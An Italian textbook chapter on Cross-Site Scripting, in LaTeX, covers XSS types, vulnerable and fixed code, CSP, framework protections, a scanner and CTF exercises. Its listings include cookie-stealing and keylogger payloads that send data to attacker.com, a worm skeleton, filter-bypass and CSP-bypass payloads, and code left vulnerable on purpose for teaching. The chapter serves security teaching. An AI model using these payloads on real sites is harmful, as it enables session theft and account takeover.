@@ -1,0 +1,945 @@
+\chapter{Cross-Site Scripting (XSS)}
+
+\section{Introduzione}
+
+Cross-Site Scripting (XSS) è una vulnerabilità che consente a un attaccante di iniettare script malevoli (tipicamente JavaScript) in pagine web visualizzate da altri utenti. XSS è una delle vulnerabilità più diffuse nelle applicazioni web moderne.
+
+\subsection{Impatto}
+
+\begin{itemize}
+    \item \textbf{Session Hijacking:} Furto di cookie di sessione
+    \item \textbf{Credential Theft:} Keylogging, phishing integrato
+    \item \textbf{Defacement:} Modifica del contenuto della pagina
+    \item \textbf{Malware Distribution:} Download drive-by
+    \item \textbf{Cryptocurrency Mining:} Cryptojacking nel browser
+    \item \textbf{Account Takeover:} Azioni in nome dell'utente
+\end{itemize}
+
+\subsection{Statistiche}
+
+\begin{itemize}
+    \item Presente nel \textbf{40\%} delle applicazioni web
+    \item \textbf{84\%} dei siti testati hanno almeno una vulnerabilità XSS
+    \item Secondo OWASP, rientra in A03:2021 - Injection
+    \item Facilmente sfruttabile anche da attaccanti poco esperti
+\end{itemize}
+
+\section{Tipologie di XSS}
+
+\subsection{1. Reflected XSS (Non-Persistent)}
+
+Lo script malevolo è riflesso dalla richiesta HTTP nella risposta, senza essere salvato sul server.
+
+\subsubsection{Meccanismo}
+
+\begin{verbatim}
+1. Attacker crea URL malevolo: http://site.com/search?q=<script>alert(1)</script>
+2. Vittima clicca sul link (social engineering)
+3. Server riflette il parametro 'q' nella pagina senza sanitizzazione
+4. Browser della vittima esegue lo script
+5. Script ruba cookie/sessione e li invia all'attacker
+\end{verbatim}
+
+\subsubsection{Codice vulnerabile}
+
+\begin{lstlisting}[language=PHP, caption=VULNERABILE - Reflected XSS]
+<?php
+// VULNERABILE: Input riflesso senza sanitizzazione
+$search_term = $_GET['q'];
+?>
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>Risultati per: <?php echo $search_term; ?></h1>
+    <!-- Se $search_term = "<script>alert(document.cookie)</script>"
+         il browser esegue lo script! -->
+</body>
+</html>
+\end{lstlisting}
+
+\subsubsection{Payload di attacco}
+
+\begin{lstlisting}[language=HTML, caption=Reflected XSS payloads]
+<!-- Basic alert -->
+<script>alert('XSS')</script>
+
+<!-- Cookie stealing -->
+<script>
+    fetch('https://attacker.com/steal?cookie=' + document.cookie);
+</script>
+
+<!-- Redirect to phishing -->
+<script>
+    window.location = 'https://fake-login.com';
+</script>
+
+<!-- Image tag XSS -->
+<img src=x onerror="alert('XSS')">
+
+<!-- SVG XSS -->
+<svg/onload=alert('XSS')>
+
+<!-- Event handler XSS -->
+<body onload=alert('XSS')>
+
+<!-- Link XSS -->
+<a href="javascript:alert('XSS')">Click me</a>
+\end{lstlisting}
+
+\subsubsection{Protezione Reflected XSS}
+
+\begin{lstlisting}[language=PHP, caption=SICURO - Output encoding]
+<?php
+// SICURO: htmlspecialchars converte caratteri speciali
+$search_term = $_GET['q'];
+?>
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>Risultati per: <?php echo htmlspecialchars($search_term, ENT_QUOTES, 'UTF-8'); ?></h1>
+    <!-- "<script>" diventa "&lt;script&gt;" → non eseguibile -->
+</body>
+</html>
+\end{lstlisting}
+
+\begin{lstlisting}[language=Python, caption=SICURO - Template auto-escaping (Flask)]
+from flask import Flask, render_template, request
+from markupsafe import escape
+
+app = Flask(__name__)
+
+@app.route('/search')
+def search():
+    query = request.args.get('q', '')
+
+    # Opzione 1: Manuale escaping
+    safe_query = escape(query)
+
+    # Opzione 2: Template auto-escaping (Jinja2 default)
+    return render_template('search.html', query=query)
+    # In template: {{ query }} → auto-escaped
+\end{lstlisting}
+
+\begin{lstlisting}[language=Java, caption=SICURO - OWASP Java Encoder]
+import org.owasp.encoder.Encode;
+
+public class SearchController {
+    @GetMapping("/search")
+    public String search(@RequestParam String q, Model model) {
+        // Encode per HTML context
+        String safeQuery = Encode.forHtml(q);
+
+        model.addAttribute("query", safeQuery);
+        return "search";
+    }
+}
+\end{lstlisting}
+
+\subsection{2. Stored XSS (Persistent)}
+
+Lo script malevolo viene salvato sul server (database, file, log) e eseguito ogni volta che la pagina viene visualizzata.
+
+\subsubsection{Meccanismo}
+
+\begin{verbatim}
+1. Attacker inserisce script in un commento/post
+2. Script salvato nel database
+3. Ogni utente che visualizza la pagina esegue lo script
+4. Impatto: tutti gli utenti sono vittime (worm potential)
+\end{verbatim}
+
+\subsubsection{Codice vulnerabile}
+
+\begin{lstlisting}[language=PHP, caption=VULNERABILE - Stored XSS in blog comments]
+<?php
+// Salvataggio commento (VULNERABILE)
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $comment = $_POST['comment'];
+    $username = $_POST['username'];
+
+    // Salva nel database senza sanitizzazione
+    $stmt = $pdo->prepare("INSERT INTO comments (username, comment) VALUES (?, ?)");
+    $stmt->execute([$username, $comment]);
+}
+
+// Visualizzazione commenti (VULNERABILE)
+$comments = $pdo->query("SELECT * FROM comments")->fetchAll();
+foreach ($comments as $comment) {
+    echo "<div>";
+    echo "<strong>" . $comment['username'] . ":</strong> ";
+    echo $comment['comment'];  // XSS qui!
+    echo "</div>";
+}
+?>
+\end{lstlisting}
+
+\subsubsection{Payload stored XSS}
+
+\begin{lstlisting}[language=HTML, caption=Stored XSS - Keylogger payload]
+<!-- Keylogger che cattura tutte le pressioni dei tasti -->
+<script>
+document.addEventListener('keypress', function(e) {
+    fetch('https://attacker.com/log?key=' + e.key + '&user=' + document.cookie);
+});
+</script>
+\end{lstlisting}
+
+\begin{lstlisting}[language=HTML, caption=Stored XSS - Session hijacking]
+<script>
+// Ruba cookie di sessione
+var img = new Image();
+img.src = 'https://attacker.com/steal?cookie=' + document.cookie +
+          '&url=' + window.location.href;
+</script>
+\end{lstlisting}
+
+\begin{lstlisting}[language=HTML, caption=Stored XSS - Self-propagating worm]
+<script>
+// Worm XSS che si auto-propaga (stile Samy worm)
+var payload = '<script>/* payload qui */</' + 'script>';
+
+// Posta il payload come nuovo commento
+fetch('/api/comment', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+        comment: payload,
+        username: 'Infected'
+    })
+});
+</script>
+\end{lstlisting}
+
+\subsubsection{Protezione Stored XSS}
+
+\begin{lstlisting}[language=Python, caption=SICURO - Input validation + output encoding]
+from flask import Flask, request, render_template
+import bleach
+from markupsafe import Markup
+
+app = Flask(__name__)
+
+# Whitelist di tag HTML permessi
+ALLOWED_TAGS = ['b', 'i', 'u', 'em', 'strong', 'p', 'br']
+ALLOWED_ATTRIBUTES = {}
+
+@app.route('/comment', methods=['POST'])
+def post_comment():
+    username = request.form.get('username')
+    comment = request.form.get('comment')
+
+    # Sanitizza input con bleach (rimuove tag non permessi)
+    clean_comment = bleach.clean(
+        comment,
+        tags=ALLOWED_TAGS,
+        attributes=ALLOWED_ATTRIBUTES,
+        strip=True
+    )
+
+    # Salva nel database
+    db.execute(
+        "INSERT INTO comments (username, comment) VALUES (?, ?)",
+        (username, clean_comment)
+    )
+
+    return "Commento salvato"
+
+@app.route('/comments')
+def view_comments():
+    comments = db.execute("SELECT * FROM comments").fetchall()
+
+    # Template con auto-escaping
+    return render_template('comments.html', comments=comments)
+\end{lstlisting}
+
+\begin{lstlisting}[language=Java, caption=SICURO - OWASP HTML Sanitizer]
+import org.owasp.html.PolicyFactory;
+import org.owasp.html.Sanitizers;
+
+public class CommentService {
+    private static final PolicyFactory POLICY = Sanitizers.FORMATTING
+        .and(Sanitizers.LINKS)
+        .and(Sanitizers.BLOCKS);
+
+    public void saveComment(String username, String comment) {
+        // Sanitizza HTML permettendo solo tag sicuri
+        String safeComment = POLICY.sanitize(comment);
+
+        // Salva nel database
+        commentRepository.save(new Comment(username, safeComment));
+    }
+}
+\end{lstlisting}
+
+\subsection{3. DOM-Based XSS}
+
+La vulnerabilità esiste interamente nel codice JavaScript lato client, senza coinvolgere il server.
+
+\subsubsection{Meccanismo}
+
+\begin{verbatim}
+1. JavaScript legge dati da una fonte controllabile dall'utente
+   (URL, localStorage, etc.)
+2. Dati usati in modo insicuro per modificare il DOM
+3. Script malevolo eseguito interamente nel browser
+4. Il server può essere completamente sicuro ma il client vulnerabile
+\end{verbatim}
+
+\subsubsection{Codice vulnerabile}
+
+\begin{lstlisting}[language=HTML, caption=VULNERABILE - DOM-Based XSS]
+<!DOCTYPE html>
+<html>
+<body>
+    <div id="welcome"></div>
+
+    <script>
+    // VULNERABILE: Legge parametro URL e lo scrive nel DOM
+    var urlParams = new URLSearchParams(window.location.search);
+    var username = urlParams.get('name');
+
+    // innerHTML è pericoloso con dati non fidati!
+    document.getElementById('welcome').innerHTML = 'Benvenuto, ' + username;
+
+    // URL: page.html?name=<img src=x onerror=alert('XSS')>
+    // Risultato: XSS eseguito!
+    </script>
+</body>
+</html>
+\end{lstlisting}
+
+\begin{lstlisting}[language=JavaScript, caption=VULNERABILE - eval() con dati utente]
+// VULNERABILE: eval con input utente
+var userInput = location.hash.substring(1);
+eval(userInput);
+
+// URL: page.html#alert('XSS')
+// eval esegue il codice!
+\end{lstlisting}
+
+\begin{lstlisting}[language=JavaScript, caption=VULNERABILE - document.write()]
+// VULNERABILE: document.write con dati URL
+var name = new URLSearchParams(window.location.search).get('name');
+document.write('Hello ' + name);
+
+// URL: ?name=<script>alert('XSS')</script>
+\end{lstlisting}
+
+\subsubsection{DOM Sinks pericolosi}
+
+\begin{lstlisting}[language=JavaScript, caption=Dangerous sinks per DOM XSS]
+// Sinks che eseguono codice:
+eval(userInput)
+setTimeout(userInput)
+setInterval(userInput)
+Function(userInput)
+new Function(userInput)
+
+// Sinks che interpretano HTML:
+element.innerHTML = userInput
+element.outerHTML = userInput
+document.write(userInput)
+document.writeln(userInput)
+
+// Sinks URL-based:
+location = userInput
+location.href = userInput
+location.assign(userInput)
+location.replace(userInput)
+
+// Attributi pericolosi:
+element.setAttribute('onclick', userInput)
+element.onclick = userInput
+<a href="javascript:userInput">
+<iframe src="javascript:userInput">
+\end{lstlisting}
+
+\subsubsection{Protezione DOM-Based XSS}
+
+\begin{lstlisting}[language=JavaScript, caption=SICURO - textContent invece di innerHTML]
+// SICURO: textContent non interpreta HTML
+var urlParams = new URLSearchParams(window.location.search);
+var username = urlParams.get('name');
+
+// textContent inserisce come testo puro
+document.getElementById('welcome').textContent = 'Benvenuto, ' + username;
+
+// Anche <script> viene trattato come testo, non codice
+\end{lstlisting}
+
+\begin{lstlisting}[language=JavaScript, caption=SICURO - DOMPurify library]
+// SICURO: DOMPurify sanitizza HTML
+import DOMPurify from 'dompurify';
+
+var urlParams = new URLSearchParams(window.location.search);
+var userHTML = urlParams.get('content');
+
+// Sanitizza prima di inserire nel DOM
+var cleanHTML = DOMPurify.sanitize(userHTML);
+document.getElementById('content').innerHTML = cleanHTML;
+
+// DOMPurify rimuove script, event handlers, etc.
+\end{lstlisting}
+
+\begin{lstlisting}[language=JavaScript, caption=SICURO - Encoding manuale]
+function escapeHTML(str) {
+    const div = document.createElement('div');
+    div.textContent = str;
+    return div.innerHTML;
+}
+
+// Oppure manualmente
+function escapeHTMLManual(str) {
+    return str
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#x27;')
+        .replace(/\//g, '&#x2F;');
+}
+
+var username = escapeHTML(urlParams.get('name'));
+document.getElementById('welcome').innerHTML = 'Benvenuto, ' + username;
+\end{lstlisting}
+
+\section{Tecniche di Bypass}
+
+\subsection{Encoding e Obfuscation}
+
+\begin{lstlisting}[language=HTML, caption=XSS bypass techniques]
+<!-- HTML Entity encoding -->
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+
+<!-- URL encoding -->
+<script>alert%28%27XSS%27%29</script>
+
+<!-- Unicode encoding -->
+<script>\u0061\u006c\u0065\u0072\u0074('XSS')</script>
+
+<!-- Case variation -->
+<ScRiPt>alert('XSS')</sCrIpT>
+
+<!-- Null bytes -->
+<script>al%00ert('XSS')</script>
+
+<!-- Double encoding -->
+%253Cscript%253Ealert('XSS')%253C/script%253E
+\end{lstlisting}
+
+\subsection{Polyglot XSS}
+
+Payload che funziona in contesti multipli.
+
+\begin{lstlisting}[language=JavaScript, caption=Polyglot XSS payload]
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
+
+<!-- Funziona in:
+- JavaScript context
+- HTML context
+- Attribute context
+- CSS context
+-->
+\end{lstlisting}
+
+\subsection{Mutation XSS (mXSS)}
+
+Sfrutta la mutazione del DOM durante il parsing.
+
+\begin{lstlisting}[language=HTML, caption=Mutation XSS]
+<!-- Input sanitizzato -->
+<noscript><p title="</noscript><img src=x onerror=alert('XSS')>">
+
+<!-- Dopo parsing/re-serialization -->
+<noscript></noscript>
+<img src=x onerror=alert('XSS')>
+<p title="">
+\end{lstlisting}
+
+\section{Content Security Policy (CSP)}
+
+CSP è un header HTTP che permette di definire politiche di sicurezza per le risorse caricate.
+
+\subsection{Configurazione base}
+
+\begin{lstlisting}[language=HTTP, caption=CSP header base]
+Content-Security-Policy: default-src 'self'
+
+<!-- Permette solo risorse dallo stesso origin -->
+\end{lstlisting}
+
+\subsection{Direttive principali}
+
+\begin{lstlisting}[language=HTTP, caption=CSP directives]
+Content-Security-Policy:
+    default-src 'self';
+    script-src 'self' https://trusted-cdn.com;
+    style-src 'self' 'unsafe-inline';
+    img-src 'self' data: https:;
+    font-src 'self' https://fonts.googleapis.com;
+    connect-src 'self' https://api.example.com;
+    frame-ancestors 'none';
+    base-uri 'self';
+    form-action 'self';
+    upgrade-insecure-requests;
+\end{lstlisting}
+
+\subsubsection{Spiegazione direttive}
+
+\begin{description}
+    \item[default-src] Fallback per tutte le direttive non specificate
+    \item[script-src] Sorgenti permesse per JavaScript
+    \item[style-src] Sorgenti permesse per CSS
+    \item[img-src] Sorgenti permesse per immagini
+    \item[font-src] Sorgenti permesse per font
+    \item[connect-src] Origini per XMLHttpRequest, WebSocket, EventSource
+    \item[frame-ancestors] Chi può includere la pagina in iframe
+    \item[base-uri] URL permessi per tag <base>
+    \item[form-action] URL validi per form submission
+\end{description}
+
+\subsection{Nonce-based CSP}
+
+\begin{lstlisting}[language=PHP, caption=CSP con nonce (PHP)]
+<?php
+// Genera nonce casuale
+$nonce = base64_encode(random_bytes(16));
+
+// Imposta CSP header con nonce
+header("Content-Security-Policy: script-src 'nonce-$nonce'");
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- Script con nonce: PERMESSO -->
+    <script nonce="<?php echo $nonce; ?>">
+        console.log('Script sicuro');
+    </script>
+
+    <!-- Script senza nonce: BLOCCATO -->
+    <script>
+        alert('Questo non viene eseguito!');
+    </script>
+
+    <!-- Script inline XSS: BLOCCATO -->
+    <!-- Anche se iniettato, non ha il nonce corretto -->
+</head>
+</html>
+\end{lstlisting}
+
+\subsection{Strict CSP}
+
+\begin{lstlisting}[language=HTTP, caption=Strict CSP configuration]
+Content-Security-Policy:
+    script-src 'nonce-{random}' 'strict-dynamic';
+    object-src 'none';
+    base-uri 'none';
+
+<!-- 'strict-dynamic' permette script caricati da script con nonce
+     ma blocca 'unsafe-inline' e whitelist domains -->
+\end{lstlisting}
+
+\subsection{CSP Reporting}
+
+\begin{lstlisting}[language=HTTP, caption=CSP report-only mode]
+Content-Security-Policy-Report-Only:
+    default-src 'self';
+    report-uri /csp-violation-report;
+
+<!-- Report-Only mode: viola policy ma NON blocca, solo report -->
+\end{lstlisting}
+
+\begin{lstlisting}[language=Python, caption=CSP violation report endpoint]
+from flask import Flask, request
+import json
+
+app = Flask(__name__)
+
+@app.route('/csp-violation-report', methods=['POST'])
+def csp_report():
+    report = request.get_json()
+
+    # Log della violazione
+    with open('csp-violations.log', 'a') as f:
+        f.write(json.dumps(report, indent=2) + '\n')
+
+    # Report format:
+    # {
+    #   "csp-report": {
+    #     "document-uri": "http://example.com/page",
+    #     "violated-directive": "script-src 'self'",
+    #     "blocked-uri": "http://evil.com/xss.js",
+    #     "source-file": "http://example.com/page",
+    #     "line-number": 12
+    #   }
+    # }
+
+    return '', 204
+\end{lstlisting}
+
+\section{Framework-Specific Protection}
+
+\subsection{React}
+
+\begin{lstlisting}[language=JavaScript, caption=React auto-escaping]
+// SICURO: React auto-escapes by default
+function Welcome({ name }) {
+    return <h1>Hello, {name}</h1>;
+}
+
+// Anche con: name = "<script>alert('XSS')</script>"
+// React fa escape automatico → sicuro
+
+// VULNERABILE: dangerouslySetInnerHTML
+function UnsafeComponent({ html }) {
+    return <div dangerouslySetInnerHTML={{ __html: html }} />;
+    // Usare solo con dati fidati o sanitizzati!
+}
+
+// SICURO: Sanitizza prima
+import DOMPurify from 'dompurify';
+
+function SafeComponent({ html }) {
+    const cleanHTML = DOMPurify.sanitize(html);
+    return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
+}
+\end{lstlisting}
+
+\subsection{Angular}
+
+\begin{lstlisting}[language=TypeScript, caption=Angular XSS protection]
+import { Component } from '@angular/core';
+import { DomSanitizer, SafeHtml } from '@angular/platform-browser';
+
+@Component({
+  selector: 'app-content',
+  template: `
+    <!-- SICURO: Auto-escaped -->
+    <div>{{ userContent }}</div>
+
+    <!-- VULNERABILE: bypassSecurityTrust -->
+    <div [innerHTML]="trustedHTML"></div>
+  `
+})
+export class ContentComponent {
+  userContent = '<script>alert("XSS")</script>';
+
+  constructor(private sanitizer: DomSanitizer) {}
+
+  // Angular sanitizza automaticamente innerHTML
+  // Ma bypassSecurityTrust disabilita protezione
+
+  get trustedHTML(): SafeHtml {
+    // Solo con dati fidati!
+    return this.sanitizer.bypassSecurityTrustHtml(this.userContent);
+  }
+}
+\end{lstlisting}
+
+\subsection{Vue.js}
+
+\begin{lstlisting}[language=JavaScript, caption=Vue.js XSS protection]
+<!-- SICURO: Interpolazione auto-escaped -->
+<template>
+  <div>{{ userInput }}</div>
+  <!-- <script> diventa &lt;script&gt; -->
+
+  <!-- VULNERABILE: v-html -->
+  <div v-html="rawHTML"></div>
+  <!-- Esegue HTML/JavaScript! -->
+</template>
+
+<script>
+import DOMPurify from 'dompurify';
+
+export default {
+  data() {
+    return {
+      userInput: '<script>alert("XSS")</script>',
+      rawHTML: this.userInput
+    };
+  },
+  computed: {
+    safeHTML() {
+      return DOMPurify.sanitize(this.rawHTML);
+    }
+  }
+}
+</script>
+\end{lstlisting}
+
+\section{Testing per XSS}
+
+\subsection{Manual Testing}
+
+\begin{lstlisting}[language=HTML, caption=XSS test payloads]
+<!-- Basic tests -->
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+
+<!-- Event handlers -->
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+
+<!-- JavaScript protocol -->
+<a href="javascript:alert(1)">click</a>
+<form action="javascript:alert(1)"><input type="submit">
+
+<!-- Data URI -->
+<object data="data:text/html,<script>alert(1)</script>">
+
+<!-- Markdown injection -->
+[xss](javascript:alert(1))
+![xss](x onerror=alert(1))
+\end{lstlisting}
+
+\subsection{Automated Testing}
+
+\begin{lstlisting}[language=Python, caption=XSS scanner script]
+import requests
+from bs4 import BeautifulSoup
+
+class XSSScanner:
+    def __init__(self, base_url):
+        self.base_url = base_url
+        self.payloads = [
+            '<script>alert(1)</script>',
+            '<img src=x onerror=alert(1)>',
+            '<svg onload=alert(1)>',
+            '\'"<script>alert(1)</script>',
+            'javascript:alert(1)'
+        ]
+
+    def test_parameter(self, url, param_name):
+        """Test un parametro per XSS"""
+        vulnerabilities = []
+
+        for payload in self.payloads:
+            params = {param_name: payload}
+            response = requests.get(url, params=params)
+
+            # Check se payload appare non-escaped nella risposta
+            if payload in response.text:
+                vulnerabilities.append({
+                    'url': url,
+                    'parameter': param_name,
+                    'payload': payload,
+                    'type': 'Reflected XSS (possibile)'
+                })
+
+        return vulnerabilities
+
+    def scan(self):
+        """Scan del sito per XSS"""
+        # Crawl sito e trova form
+        response = requests.get(self.base_url)
+        soup = BeautifulSoup(response.text, 'html.parser')
+
+        results = []
+
+        # Test GET parameters
+        for link in soup.find_all('a', href=True):
+            href = link['href']
+            if '?' in href:
+                # Estrai parametri
+                # Test ciascun parametro
+                pass
+
+        # Test form fields
+        for form in soup.find_all('form'):
+            for input_field in form.find_all('input'):
+                name = input_field.get('name')
+                if name:
+                    vulns = self.test_parameter(self.base_url, name)
+                    results.extend(vulns)
+
+        return results
+
+# Uso
+scanner = XSSScanner('http://target-site.com')
+vulns = scanner.scan()
+
+for vuln in vulns:
+    print(f"[!] XSS trovato: {vuln}")
+\end{lstlisting}
+
+\section{Esercizi CTF-Style}
+
+\subsection{Challenge 1: Basic Reflected XSS}
+
+URL: \texttt{http://ctf-xss.local/search?q=test}
+
+Trova un payload XSS che bypassa questo filtro:
+
+\begin{lstlisting}[language=PHP]
+<?php
+$query = $_GET['q'];
+$query = str_replace('<script>', '', $query);
+echo "Risultati: " . $query;
+?>
+\end{lstlisting}
+
+\textbf{Soluzione:}
+\begin{lstlisting}[language=HTML]
+<!-- Bypass con case variation -->
+?q=<ScRiPt>alert('XSS')</ScRiPt>
+
+<!-- Oppure nested -->
+?q=<scr<script>ipt>alert('XSS')</script>
+
+<!-- Oppure tag alternativo -->
+?q=<img src=x onerror=alert('XSS')>
+\end{lstlisting}
+
+\subsection{Challenge 2: Stored XSS in Comments}
+
+Trova XSS in questa applicazione che filtra \texttt{<script>}:
+
+\begin{lstlisting}[language=Python]
+@app.route('/comment', methods=['POST'])
+def post_comment():
+    comment = request.form.get('comment')
+    comment = comment.replace('<script>', '').replace('</script>', '')
+    db.save_comment(comment)
+\end{lstlisting}
+
+\textbf{Soluzione:}
+\begin{lstlisting}[language=HTML]
+<!-- Event handler in img tag -->
+<img src=x onerror="fetch('https://attacker.com/steal?c=' + document.cookie)">
+
+<!-- SVG -->
+<svg/onload=alert(document.domain)>
+
+<!-- Body tag -->
+<body onload=alert('XSS')>
+\end{lstlisting}
+
+\subsection{Challenge 3: DOM-Based XSS}
+
+Trova XSS in questo JavaScript:
+
+\begin{lstlisting}[language=JavaScript]
+var username = location.hash.substring(1);
+if (username) {
+    document.getElementById('welcome').innerHTML = 'Welcome ' + username;
+}
+\end{lstlisting}
+
+\textbf{Soluzione:}
+\begin{lstlisting}[language=HTML]
+<!-- URL -->
+http://target.com/page.html#<img src=x onerror=alert('XSS')>
+
+<!-- Flag -->
+CTF{d0m_b4s3d_xss_pwn3d}
+\end{lstlisting}
+
+\subsection{Challenge 4: CSP Bypass}
+
+Bypassa questa CSP policy:
+
+\begin{lstlisting}[language=HTTP]
+Content-Security-Policy: script-src 'self' https://cdn.example.com
+\end{lstlisting}
+
+Hint: \texttt{https://cdn.example.com/angular.js} è caricabile.
+
+\textbf{Soluzione:}
+\begin{lstlisting}[language=HTML]
+<!-- AngularJS CSP bypass -->
+<div ng-app ng-csp>
+  {{constructor.constructor('alert(1)')()}}
+</div>
+
+<script src="https://cdn.example.com/angular.js"></script>
+\end{lstlisting}
+
+\section{Case Study: Samy Worm (MySpace, 2005)}
+
+\subsection{Background}
+
+Il primo self-propagating XSS worm, creato da Samy Kamkar, che infettò oltre 1 milione di profili MySpace in meno di 24 ore.
+
+\subsection{Tecnica}
+
+\begin{lstlisting}[language=JavaScript, caption=Simplified Samy worm logic]
+// Payload inserito nel profilo di Samy
+var payload = `
+<div id="mycode">
+<script>
+// 1. Aggiunge "Samy is my hero" al profilo della vittima
+// 2. Aggiunge Samy come amico
+// 3. Copia se stesso nel profilo della vittima
+
+var friendID = '11851658'; // Samy's ID
+
+// Aggiunge come amico via XMLHttpRequest
+var request = new XMLHttpRequest();
+request.open('POST', '/index.cfm?fuseaction=invite.addFriend', true);
+request.send('friendID=' + friendID);
+
+// Propaga il worm
+var div = document.createElement('div');
+div.innerHTML = document.getElementById('mycode').innerHTML;
+document.body.appendChild(div);
+</script>
+</div>
+`;
+
+// MySpace filtrava "javascript" e "onload"
+// Samy usò encoding: "java\nscript", "onload" → "on" + "load"
+\end{lstlisting}
+
+\subsection{Impatto}
+
+\begin{itemize}
+    \item 1 milione+ profili infetti in < 20 ore
+    \item MySpace forzato a chiudere temporaneamente
+    \item Samy arrestato e condannato a 3 anni probation
+    \item Dimostrazione del potenziale distruttivo di XSS
+\end{itemize}
+
+\section{Best Practices}
+
+\begin{itemize}
+    \item[$\square$] \textbf{Output Encoding:} Sempre escape output in base al contesto (HTML, JavaScript, URL, CSS)
+    \item[$\square$] \textbf{Input Validation:} Whitelist approach quando possibile
+    \item[$\square$] \textbf{Content Security Policy:} Implementa CSP strict
+    \item[$\square$] \textbf{HTTPOnly Cookies:} Previene accesso via JavaScript
+    \item[$\square$] \textbf{Framework Features:} Usa auto-escaping dei framework moderni
+    \item[$\square$] \textbf{Sanitization Libraries:} DOMPurify, OWASP Java Encoder
+    \item[$\square$] \textbf{Template Engines:} Con auto-escaping abilitato
+    \item[$\square$] \textbf{Evita Dangerous Sinks:} innerHTML, eval(), document.write()
+    \item[$\square$] \textbf{Testing:} Automated XSS scanning in CI/CD
+    \item[$\square$] \textbf{Security Headers:} X-XSS-Protection (legacy), X-Content-Type-Options
+\end{itemize}
+
+\section{Tools}
+
+\begin{itemize}
+    \item \textbf{XSStrike:} Advanced XSS detection suite
+    \item \textbf{Burp Suite:} XSS scanner e validator
+    \item \textbf{OWASP ZAP:} Automated XSS scanning
+    \item \textbf{DOMPurify:} Client-side HTML sanitization
+    \item \textbf{Google's CSP Evaluator:} CSP policy analyzer
+    \item \textbf{BeEF:} Browser Exploitation Framework
+\end{itemize}
+
+\section{Conclusioni}
+
+XSS rimane una delle vulnerabilità più comuni nonostante sia ben compresa e facilmente prevenibile con le giuste pratiche. La chiave è:
+
+\begin{enumerate}
+    \item \textbf{Treat all input as untrusted}
+    \item \textbf{Encode output appropriately}
+    \item \textbf{Use CSP as defense in depth}
+    \item \textbf{Leverage framework protections}
+    \item \textbf{Test rigorosamente}
+\end{enumerate}
+
+Nel prossimo capitolo esploreremo CSRF (Cross-Site Request Forgery), un attacco che spesso viene confuso con XSS ma ha meccaniche completamente diverse.
